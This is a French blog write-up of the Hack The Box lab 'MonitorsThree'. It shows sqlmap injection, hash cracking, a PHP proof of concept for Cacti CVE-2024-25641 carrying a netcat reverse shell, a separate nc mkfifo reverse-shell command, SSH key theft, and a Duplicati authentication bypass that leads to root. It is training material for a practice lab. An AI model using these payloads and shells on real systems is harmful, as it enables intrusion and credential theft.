---
date: 2025-01-17T10:06:34-06:00
# description: ""
image: "/images/HTB-MonitorsThree/MonitorsThree.png"
showTableOfContents: true
tags: ["HackTheBox"]
categories: ["Writeups"]
title: "HTB: MonitorsThree"
type: "post"
---

* Platforme: Hack The Box
* Lien: [MonitorsThree](https://app.hackthebox.com/machines/MonitorsThree)
* Niveau: Moyen
* OS: Linux
---

[Lire cet article en anglais](https://scorpiosec.com/posts/htb-monitorsthree/)

MonitorsThree héberge un site web sur le port 80 et une instance Cacti sur un sous-domaine. La fonction `Forgot Password?` sur le site principal est vulnérable à l'injection SQL, que nous exploitons pour récupérer le mot de passe de l'utilisateur admin. En utilisant ces informations d'identification, nous accédons au tableau de bord de Cacti et utilisons le `CVE-2024-25641` pour obtenir un accès initial au système. Une exploration plus poussée révèle d'autres hachages de mots de passe, ce qui nous permet de pivoter vers un autre utilisateur via SSH. À travers l'énumération du système, nous découvrons une instance de Duplicati accessible en interne. Avec un tunnel, nous sommes capables d'y accéder et grâce à un exploit de contournement d'authentification nous nous connectons à Duplicati et récupérons le drapeau root.

Adresse IP cible - `10.10.11.30`

## Balayage

```
nmap -sC -sV -oA nmap/MonitorsThree 10.10.11.30
```

**Résultats**

```shell
Starting Nmap 7.94SVN ( https://nmap.org ) at 2025-01-14 18:00 CST
Nmap scan report for 10.10.11.30
Host is up (0.060s latency).
Not shown: 997 closed tcp ports (conn-refused)
PORT     STATE    SERVICE VERSION
22/tcp   open     ssh     OpenSSH 8.9p1 Ubuntu 3ubuntu0.10 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   256 86:f8:7d:6f:42:91:bb:89:72:91:af:72:f3:01:ff:5b (ECDSA)
|_  256 50:f9:ed:8e:73:64:9e:aa:f6:08:95:14:f0:a6:0d:57 (ED25519)

80/tcp   open     http    nginx 1.18.0 (Ubuntu)
|_http-server-header: nginx/1.18.0 (Ubuntu)
|_http-title: Did not follow redirect to http://monitorsthree.htb/

8084/tcp filtered websnp
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 13.83 seconds
```

Nous avons trois ports ouverts :
* 22 pour SSH
* 80 exécute HTTP, avec une redirection vers `monitorsthree.htb`.


## Enumération

En allant sur `http://monitorsthree.htb/`, nous trouvons un site web offrant des services de solutions de réseau.

![MonitorsThree website](/images/HTB-MonitorsThree/monitorsthree_website.png)

Il existe une page de connexion à l'adresse `http://monitorsthree.htb/login.php`.

![MonitorsThree login](/images/HTB-MonitorsThree/login_page_monitorsthree.png)

Une attaque par force brute sur les répertoires révèle la présence de `/admin` mais nous ne pouvons pas y accéder pour le moment.

```
gobuster dir -w /usr/share/seclists/Discovery/Web-Content/directory-list-2.3-medium.txt -u http://monitorsthree.htb/
```

![directory brute forcing](/images/HTB-MonitorsThree/gobuster_cmd.png)

![admin page monitorsthree](/images/HTB-MonitorsThree/monitorsthree_admin.png)

Nous trouvons également un sous-domaine (`cacti`) grâce à l'énumération des sous-domaines.

```
ffuf -c -w /usr/share/seclists/Discovery/DNS/subdomains-top1million-110000.txt --fc 404 -t 100 -u http://monitorsthree.htb -H "Host: FUZZ.monitorsthree.htb" -ic -fs 13560
```

![cacti subdomain](/images/HTB-MonitorsThree/monitorsthree_subdomain.png)

A `http://cacti.monitorsthree.htb/cacti/` nous trouvons une autre page de connexion. Nous observons une version pour le logiciel, `1.2.26`.

![cacti login page](/images/HTB-MonitorsThree/cacti_login_page.png)

Nous arrivons à `http://monitorsthree.htb/forgot_password.php` après avoir sélectionné `Forgot password?` à `http://monitorsthree.htb/login.php`.

![forgot password page](/images/HTB-MonitorsThree/forgot_pwd.png)

Nous essayons d'exploiter cette fonctionnalité par le biais d'une injection SQL. Nous capturons la requête et l'utilisons avec SQLmap.

![reset password request](/images/HTB-MonitorsThree/reset_pwd_request.png)

Nous commençons par cibler le paramètre `username` et SQLmap est capable d'identifier l'injection.

```
sqlmap -r reset.txt --level 5 --risk 3 -p username --batch --threads=10
```

![SQL injection on username parameter](/images/HTB-MonitorsThree/sqlmap1.png)

Nous énumérons la cible et trouvons deux bases de données.

```
sqlmap -r reset.txt --level 5 --risk 3 -p username --batch --threads=10 --batch --dbs
```

![databases found](/images/HTB-MonitorsThree/dbs_found.png)

Nous pouvons maintenant énumérer les tables de la base de données `monitorsthree_db` puisque `information_schema` est une base de données système par défaut dans MySQL.

```
sqlmap -r reset.txt --level 5 --risk 3 -p username --batch --threads=10 --batch -D monitorsthree_db --tables
```

![tables found](/images/HTB-MonitorsThree/db_tables.png)

La table `users` est la plus prometteuse.

```
sqlmap -r reset.txt --level 5 --risk 3 -p username --batch --threads=10 -D monitorsthree_db -T users --dbms=mysql --technique=T --dump
```

![SQLmap hashes found](/images/HTB-MonitorsThree/SQLmap_hashes.png)

Nous récupérons le mot de passe de `admin` avec hashcat.

```
hashcat -m 0 -a 0 admin_hash.txt /usr/share/wordlists/rockyou.txt
```

![admin password](/images/HTB-MonitorsThree/admin_pwd.png)

Avec les identifiants `admin:greencacti2001` nous nous connectons à Cacti et accédons au tableau de bord.

> Les mêmes identifiants fonctionnent également sur la page de connexion à `http://monitorsthree.htb/login.php`.

![cacti dashboard](/images/HTB-MonitorsThree/cacti_dashboard.png)

## Accès initial

### Exploitation manuelle

La recherche de vulnérabilités pour la version 1.2.26 de `Cacti` conduit au `CVE-2024-25641` permettant un RCE en utilisant un paquet malveillant. Le PoC est disponible [ici](https://github.com/cacti/cacti/security/advisories/GHSA-7cmj-g5qc-pj88).

```PHP
<?php

$xmldata = "<xml>
   <files>
       <file>
           <name>resource/test.php</name>
           <data>%s</data>
           <filesignature>%s</filesignature>
       </file>
   </files>
   <publickey>%s</publickey>
   <signature></signature>
</xml>";
$filedata = "<?php shell_exec('rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|bash -i 2>&1|nc {IP} {PORT} >/tmp/f'); ?>";
$keypair = openssl_pkey_new(); 
$public_key = openssl_pkey_get_details($keypair)["key"]; 
openssl_sign($filedata, $filesignature, $keypair, OPENSSL_ALGO_SHA256);
$data = sprintf($xmldata, base64_encode($filedata), base64_encode($filesignature), base64_encode($public_key));
openssl_sign($data, $signature, $keypair, OPENSSL_ALGO_SHA256);
file_put_contents("test.xml", str_replace("<signature></signature>", "<signature>".base64_encode($signature)."</signature>", $data));
system("cat test.xml | gzip -9 > test.xml.gz; rm test.xml");

?>
```

Après exécution du script, nous obtenons `test.xml.gz`. Dans Cacti, nous allons dans `Import/Export` > `Import Packages`. 

Nous téléchargeons le paquet malveillant et l'importons.

![cacti package import](/images/HTB-MonitorsThree/cacti_pkg_import.png)

Nous exécutons notre payload en allant sur `http://cacti.monitorsthree.htb/cacti/resource/test.php` et recevons une connexion sur notre listener.

![manual exploit foothold](/images/HTB-MonitorsThree/foothold_manual.png)

### Exploitation avec Metasploit

Dans Metasploit, nous pouvons utiliser le `multi/http/cacti_package_import_rce` pour obtenir un shell en tant que `www-data`.

```
set password greencacti2001
set rhosts cacti.monitorsthree.htb
set lhost tun0
set lport PORT_NUMBER
```

![Metasploit exploit foothold](/images/HTB-MonitorsThree/foothold_cacti.png)

Le shell n'étant pas interactif, nous passons à un shell plus performant.

![bad shell](/images/HTB-MonitorsThree/bad_shell.png)

En utilisant une commande de shell inversé (`nc mkfifo`) disponible sur [revshells](https://www.revshells.com/), nous obtenons un shell que nous améliorons.

```
rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|sh -i 2>&1|nc YOUR_IP PORT_NUMBER >/tmp/f
```

![better shell](/images/HTB-MonitorsThree/better_shell.png)

Une simple recherche sur Google nous apprend que le fichier de configuration de Cacti est situé dans `/var/www/html/cacti/include/config.php`. 

![Cacti configuration file location](/images/HTB-MonitorsThree/cacti_config_file_location.png)

Ce fichier contient des informations d'identification pour la base de données.

![database credentials](/images/HTB-MonitorsThree/db_creds.png)

Nous nous connectons à la base de données.

```
mysql -u cactiuser -p cactiuser
```

Après avoir listé les tables, nous trouvons des hachages de mots de passe dans la table `user_auth`. Il s'agit de hachages Blowfish.

```
show tables;

select * from user_auth;
```

![password hashes](/images/HTB-MonitorsThree/pwd_hashes.png)

Avec hashcat, nous récupérons le mot de passe de l'utilisateur marcus, `12345678910`.

```
hashcat -m 3200 -a 0 marcus_hash.txt /usr/share/wordlists/rockyou.txt
```

![marcus password](/images/HTB-MonitorsThree/marcus_pwd.png)

## Shell en tant que marcus

Nous passons à l'utilisateur `marcus` et trouvons le drapeau utilisateur dans son répertoire personnel.

![user flag](/images/HTB-MonitorsThree/user_flag.png)

Les clés SSH pour `marcus` sont dans `/.ssh/`, nous envoyons le fichier `id_rsa` à notre machine locale afin de nous connecter via SSH.

![marcus ssh key](/images/HTB-MonitorsThree/ssh_key_marcus.png)

```
ssh -i id_rsa marcus@monitorsthree.htb
```

![marcus ssh login](/images/HTB-MonitorsThree/marcus_ssh_login.png)

Après avoir exécuté linpeas, nous trouvons quelques connexions internes. Nous allons vérifier les ports `8200` et `37181`.

![active ports](/images/HTB-MonitorsThree/active_ports.png)

Nous devons faire du tunneling pour accéder à ces ports, j'ai utilisé [ligolo-ng](https://github.com/nicocha30/ligolo-ng/releases) pour le faire.

Seul le port `8200` est accessible, où nous trouvons une page de connexion [Duplicati](https://duplicati.com/).

> Duplicati est un logiciel de sauvegarde open-source conçu pour stocker en toute sécurité des sauvegardes de données.

![Duplicati login page](/images/HTB-MonitorsThree/duplicati_login.png)

En recherchant les vulnerabilités de Duplicati, nous trouvons [ici](https://medium.com/@STarXT/duplicati-bypassing-login-authentication-with-server-passphrase-024d6991e9ee) un article sur Medium démontrant un contournement de l'authentification et une page Github détaillant les étapes pour reproduire l'exploit [ici](https://github.com/duplicati/duplicati/issues/5197).

![Exploit steps](/images/HTB-MonitorsThree/exploit_steps.png)

En inspectant le résultat de linpeas, nous constatons qu'il y a un répertoire Duplicati dans `/opt`.

![Duplicati opt directory](/images/HTB-MonitorsThree/duplicati_opt_directory.png)

Nous trouvons `Duplicati-server.sqlite` dans `/opt/duplicati/config`.

![Duplicati database file](/images/HTB-MonitorsThree/duplicati_db_file.png)

Avec `scp`, nous téléchargeons le fichier de la base de données, qui contient la phrase d'authentification du serveur.

```
scp -i id_rsa marcus@monitorsthree.htb:/opt/duplicati/config/Duplicati-server.sqlite /home/kscorpio/Machines/HTB/MonitorsThree
```

![Duplicati server passphrase](/images/HTB-MonitorsThree/server-passphrase.png)

Ensuite, nous convertissons la phrase d'authentification du serveur en HEX.

```
echo "Wb6e855L3sN9LTaCuwPXuautswTIQbekmMAr7BrK2Ho=" | base64 -d | xxd -p
```

![server passphrase HEX conversion](/images/HTB-MonitorsThree/HEX_conversion.png)

```
59be9ef39e4bdec37d2d3682bb03d7b9abadb304c841b7a498c02bec1acad87a
```

Avec Burp, nous interceptons une requête de connexion et notons la valeur de `session-nonce`. Cette valeur sera différente pour chaque requête, et nous devons la décoder (Ctrl + U).

![Duplicati login request](/images/HTB-MonitorsThree/duplicati_login_request.png)

Dans le navigateur, nous ouvrons la console et utilisons la commande suivante

```
var noncepwd = CryptoJS.SHA256(CryptoJS.enc.Hex.parse(CryptoJS.enc.Base64.parse('url_decoded_nonce_value') + 'salted_hex_passphrase')).toString(CryptoJS.enc.Base64);
```

Ensuite, nous exécutons `noncepwd` pour obtenir la nouvelle valeur du mot de passe.

```
noncepwd
```

![Duplicati auth bypass](/images/HTB-MonitorsThree/duplicati_auth_bypass.png)

Dans Burp, nous remplaçons la valeur de `password` par la valeur de `noncepwd` et l'encodons avec Ctrl + U.

![New password](/images/HTB-MonitorsThree/new_password.png)

Après avoir transmis la demande, nous sommes maintenant connectés à Duplicati.

![Duplicati dashboard](/images/HTB-MonitorsThree/duplicati_dashboard.png)

## Elévation de Privilèges

### Récupération du drapeau root

Allez dans `Add Backup` > `Configure a new backup`. Pour `General backup settings`, choisissez un nom et générez une phrase d'authentification (passphrase). Vous pouvez aussi changer `Encryption` en `No encryption` si vous le souhaitez.

![Backup command 1](/images/HTB-MonitorsThree/backup1.png)

Pour la destination de la sauvegarde, nous entrons `/source/tmp`.

![Backup command 2](/images/HTB-MonitorsThree/backup2.png)

Ajoutez le chemin `/source/root/root.txt` dans la section `Source Data`.

![Backup command 3](/images/HTB-MonitorsThree/backup3.png)

Dans la section `Schedule` décochez les sauvegardes automatiques et enfin sauvegardez votre backup. 

Dans la section `Home`, exécutez votre sauvegarde en cliquant sur le bouton `Run now`.

![Run backup now button](/images/HTB-MonitorsThree/run_now_backup.png)

Allez dans `Restore`, choisissez votre sauvegarde et sélectionnez les fichiers à restaurer.

![restore root flag](/images/HTB-MonitorsThree/files_to_restore.png)

Décider où restaurer les fichiers, nous devons choisir un répertoire auquel `marcus` peut accéder.

![restore root flag location](/images/HTB-MonitorsThree/restore_location.png)

Une fois la sauvegarde terminée, le drapeau root est désormais accessible.

![root flag](/images/HTB-MonitorsThree/root_flag.png)

### Accès au compte root

Bien que nous ayons lu le drapeau root, nous n'avons toujours pas accès au compte root.

En utilisant le même processus de sauvegarde, nous découvrons que le seul fichier dans `/root/.ssh` est `authorized_keys` et que ce fichier est vide.

![root SSH directory](/images/HTB-MonitorsThree/root_ssh_directory.png)

> Nous n'avons pas les droits d'écriture sur le fichier `authorized_keys` appartenant à root, autrement nous y aurions simplement ajouté la clé publique de Marcus.

![root authorized_keys file](/images/HTB-MonitorsThree/root_authorized_keys.png)

Nous pouvons faire une sauvegarde de `/home/marcus/.ssh/authorized_keys` et la restaurer dans `/root/.ssh/` afin d'être capable de se connecter en tant que root via SSH.

Pour la nouvelle sauvegarde, sélectionnez `/source/home/marcus/.ssh/` comme `Source Data`.

![Source data for SSH backup](/images/HTB-MonitorsThree/source_data_root.png)

Restaurez le fichier `authorized_keys`.

![authorized_keys file restore](/images/HTB-MonitorsThree/restore_file_root.png)

Entrez `/source/root/.ssh/` comme emplacement.

![authorized_keys file restore location](/images/HTB-MonitorsThree/restore_file_root.png)

Nous sommes maintenant capables de nous connecter en tant que root via SSH, et comme le montre l'image ci-dessous, `authorized_keys` n'est plus vide.

![SSH root login](/images/HTB-MonitorsThree/root_account.png)
